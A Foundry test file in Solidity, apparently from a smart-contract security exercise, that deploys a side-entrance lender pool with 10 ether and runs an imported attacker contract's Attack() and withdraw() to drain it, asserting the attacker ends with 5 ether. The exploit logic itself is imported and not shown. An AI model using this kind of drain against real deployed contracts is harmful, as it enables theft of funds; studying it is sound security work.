// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Side-reentrancy/Victim.sol";
import "../src/Side-reentrancy/Attacker.sol";

contract SelfdestructTest is Test {
    SideEntranceLenderPool pool;
    SideEntranceLenderPoolAttacker attacker;
    //Externally owned account
    address attackerEOA = address(0xdead);

    function setUp() public {
        pool = new SideEntranceLenderPool();
        pool.deposit{value: 10 ether}();
        vm.prank(attackerEOA);
        attacker = new SideEntranceLenderPoolAttacker(address(pool));
    }

    function testAttack() public {
        vm.prank(attackerEOA);
        attacker.Attack();
        vm.prank(attackerEOA);
        attacker.withdraw();
        uint256 attackerBalance = attackerEOA.balance;
        assertEq(5 ether, attackerBalance);
        // emit log_named_uint("Balance is", attackerEOA.balance);
    }
}
